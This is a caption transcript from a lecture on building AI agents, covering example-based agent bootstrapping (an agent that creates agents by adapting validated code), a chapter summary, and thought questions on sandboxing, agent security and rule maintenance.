+The most effective path to solving these problems is not to exhaustively list all rules in the prompt, but to provide high-quality Agent implementations as reference examples, guiding the code generation Agent to modify them rather than starting from scratch.
+
+844
+02:11:21.183 --> 02:11:27.983
+The advantage of example-based generation is plain: the example code itself carries the best practices.
+
+845
+02:11:27.983 --> 02:11:40.933
+An Agent that adapts a validated implementation gets things right more often than one that starts from scratch, because the implementation preserves sound architectural choices without requiring every rule to be spelled out in the prompt.
+
+846
+02:11:40.933 --> 02:12:01.458
+When an Agent receives a task to develop a new Agent, it should first copy its own code (or other validated, high-quality implementations) and then make targeted modifications: adjust the system prompt to match the new role, replace or add tools to suit new functions, modify business logic while preserving the architectural framework.
+
+847
+02:12:01.458 --> 02:12:14.958
+This "self-replication with adaptive modification" pattern ensures the new Agent inherits core technical advantages while allowing differentiation in specific dimensions—much like gene replication with mutation in biology.
+
+848
+02:12:14.958 --> 02:12:22.095
+Experiment 5-16 advanced difficulty, three stars: : Develop an Agent That Can Create Agents
+
+849
+02:12:22.095 --> 02:12:37.033
+Experiment Goal: Build a Coding Agent with metaprogramming capabilities—the ability to write programs that generate or modify other programs—so that it can automatically create new Agent systems from user requirements while adhering to best practices.
+
+850
+02:12:37.033 --> 02:12:47.620
+Technical Approach: Provide the Coding Agent with high-quality Agent implementations as reference examples (the ch5/coding-agent project itself can be used).
+
+851
+02:12:47.620 --> 02:12:56.820
+When tasked with creating a new Agent, the Agent first copies this example code and then makes targeted modifications based on the user's specific needs.
+
+852
+02:12:56.820 --> 02:13:03.120
+Acceptance Criteria: The generated Agent runs successfully and completes basic tasks.
+
+853
+02:13:03.120 --> 02:13:14.933
+Verify that it uses standard message formats and tool-call protocols, currently recommended models and APIs, and correct context and state management across multiple conversation turns.
+
+854
+02:13:14.933 --> 02:13:22.545
+Compare generation from scratch with example-based modification, and confirm that the latter improves quality and efficiency.
+
+855
+02:13:22.545 --> 02:13:28.433
+As illustrated in Figure 5-11: Pipeline of an Agent That Can Create Agents.
+
+856
+02:13:28.433 --> 02:13:30.320
+Chapter Summary.
+
+857
+02:13:30.320 --> 02:13:40.408
+This chapter has argued one thing throughout: code is not merely a tool for writing programs—it is the language of an Agent's formalized thinking and precise expression.
+
+858
+02:13:40.564 --> 02:13:58.801
+The Harness engineering section reached one central conclusion: Coding Agents are mature not because code generation models are exceptionally strong, but because decades of accumulated software engineering infrastructure—test suites, type systems, version control—naturally form a powerful Harness.
+
+859
+02:13:58.751 --> 02:14:03.114
+That conclusion deserves to travel to other Agent scenarios.
+
+860
+02:14:03.114 --> 02:14:18.839
+The section on failure and error recovery offers the flip side of the same theme: an Agent's reliability is determined not by whether the model makes mistakes, but by whether every class of failure has a corresponding detection, recovery, handover, and termination path.
+
+861
+02:14:18.839 --> 02:14:27.151
+The second part demonstrated the broad value of code generation beyond programming, corresponding to the six dimensions in the main text:
+
+862
+02:14:27.151 --> 02:14:35.064
+Thinking Tool: Leveraging symbolic computation and constraint solving to compensate for the shortcomings of probabilistic thinking
+
+863
+02:14:35.064 --> 02:14:47.876
+Business Rule Constraints: Expressing business rules unambiguously and providing a deterministic safety backstop for irreversible operations, where the value of the guarantee far exceeds its implementation cost
+
+864
+02:14:47.876 --> 02:15:02.326
+Multimedia Generation: Creating multimodal content like PPTs and videos through a Proposer-Reviewer mechanism; the choice between code generation and generative models depends on the artifact's intrinsic complexity and precision requirements
+
+865
+02:15:02.326 --> 02:15:10.664
+System Adapter: Automatically following format evolution to achieve full automation of log parsing and problem diagnosis
+
+866
+02:15:10.664 --> 02:15:21.289
+Generative UI: Dynamically creating forms, visualizations, and even complete customizable applications, breaking free from plain text limitations
+
+867
+02:15:21.289 --> 02:15:30.139
+Agent Bootstrapping: Using code to repair existing Agents and create new ones, ultimately enabling an Agent to create other Agents
+
+868
+02:15:30.139 --> 02:15:42.751
+The value of code to an Agent comes down to this: it is at once a means of getting tasks done and a mechanism for accumulating knowledge, creating tools, and improving itself—a true "meta-capability.
+
+869
+02:15:42.751 --> 02:15:55.339
+At this point, we have combined context, knowledge, tools, and coding capabilities into the foundational architecture of a general-purpose Agent, with code generation as its most general meta-capability.
+
+870
+02:15:55.339 --> 02:16:00.751
+Yet the first five chapters still assume that the Agent and the world take turns acting.
+
+871
+02:16:00.751 --> 02:16:16.939
+Chapter 6 fills in the final piece of “Building Agents” by extending the observation and action spaces to asynchronous events, voice, screens, and the physical world; once that piece is in place, Chapter 7 turns to evaluation and continual improvement.
+
+872
+02:16:16.939 --> 02:16:18.876
+Thought Questions.
+
+873
+02:16:19.036 --> 02:16:25.648
+intermediate difficulty, two stars:  Code generation is called an Agent's “meta-capability.
+
+874
+02:16:25.598 --> 02:16:34.986
+But code execution introduces security risks—Agent-generated code may contain vulnerabilities, enter infinite loops, or exhaust resources.
+
+875
+02:16:34.986 --> 02:16:44.261
+Sandboxing can mitigate some of these risks, but it also limits what the code can do, for example by denying access to the network or file system.
+
+876
+02:16:44.261 --> 02:16:48.873
+How can the optimal balance between security and capability be found?
+
+877
+02:16:48.873 --> 02:16:58.436
+advanced difficulty, three stars:  Agent bootstrapping—an Agent that can create Agents—enables the “self-reproduction of intelligence.
+
+878
+02:16:58.436 --> 02:17:03.448
+But every bootstrapping iteration may introduce new biases or errors.
+
+879
+02:17:03.448 --> 02:17:07.011
+Will these errors accumulate across generations?
+
+880
+02:17:07.011 --> 02:17:10.786
+How can degradation in Agent bootstrapping be prevented?
+
+881
+02:17:10.786 --> 02:17:19.961
+intermediate difficulty, two stars:  When a code-generation Agent handles log parsing, it can automatically follow format evolution.
+
+882
+02:17:19.961 --> 02:17:27.736
+But if a format change is a bug rather than an intended modification, the Agent's adaptability may instead conceal the problem.
+
+883
+02:17:27.736 --> 02:17:35.111
+How should the Agent distinguish between “a change that requires adaptation” and “an anomaly that requires reporting”?
+
+884
+02:17:35.111 --> 02:17:46.023
+intermediate difficulty, two stars:  This chapter repeatedly uses the proposer-reviewer mechanism in PPT generation, video editing, and log visualization.
+
+885
+02:17:46.023 --> 02:17:59.473
+If the Reviewer's aesthetic preferences differ from those of the target user—for example, if the Reviewer considers the information density reasonable but the user finds it too crowded—the feedback loop may converge on the wrong local optimum.
+
+886
+02:17:59.473 --> 02:18:03.911
+How can user-preference feedback be incorporated into the Reviewer loop?
+
+887
+02:18:03.911 --> 02:18:23.873
+intermediate difficulty, two stars:  This chapter demonstrates several ways for a Coding Agent to consolidate experience gained through execution and debugging back into the codebase—writing knowledge-base files, updating architecture documentation, maintaining project instruction files, and encoding operational sequences as code.
+
+888
+02:18:23.873 --> 02:18:31.348
+If this experience is further distilled into rules in the system prompt, the rule set will continue to expand over time.
+
+889
+02:18:31.348 --> 02:18:39.011
+How can “garbage collection” be performed on the accumulated rules to identify and remove redundant or outdated entries?
+
+890
+02:18:39.011 --> 02:18:45.561
+Why is a single successful code modification not yet continuous evolution in the sense of Chapter 9?
+
+891
+02:18:45.561 --> 02:18:53.448
+introductory difficulty, one star:  “Teams that are friendly to remote work are often also friendly to AI Agents.
+
+892
+02:18:53.448 --> 02:18:59.873
+How close is your team or organization to being “AI-ready” in terms of knowledge documentation?
+
+893
+02:18:59.873 --> 02:19:02.311
+What is the greatest obstacle?
+
+894
+02:19:02.311 --> 02:19:15.173
+advanced difficulty, three stars:  Simon Willison proposed the “Lethal Triad” for Agents—access to private data, exposure to untrusted content, and external communication capability.
+
+895
+02:19:15.173 --> 02:19:19.223
+This chapter adds a fourth element: persistent memory.
+
+896
+02:19:19.223 --> 02:19:25.761
+How would you design a security strategy for a production environment that must handle all four simultaneously?
+
+897
+02:19:25.761 --> 02:19:39.586
+intermediate difficulty, two stars:  The Artifact pattern allows an Agent to generate SQL or frontend code for execution by the database and browser, bypassing the need for the LLM to process large volumes of data.
+
+898
+02:19:39.586 --> 02:19:51.398
+What are the advantages and disadvantages of this division of labor—“the Agent generates code, the system executes code”—compared with the traditional pattern in which the Agent directly provides the answer?
+
+899
+02:19:51.398 --> 02:19:59.636
+Moreover, generated SQL may perform destructive operations, and generated HTML may contain vulnerabilities.
+
+900
+02:19:59.636 --> 02:20:02.698
+How can the system's security be ensured?
+
+901
+02:20:02.698 --> 02:20:19.386
+intermediate difficulty, two stars:  Encoding business rules as checks inside tools against authoritative database records, while using parameter design to guide the model to check policy conditions before making a call, essentially uses code structure to constrain Agent behavior.
+
+902
+02:20:19.386 --> 02:20:26.686
+What are the advantages and limitations of this “code as rules” pattern compared with rules expressed in natural language?
+
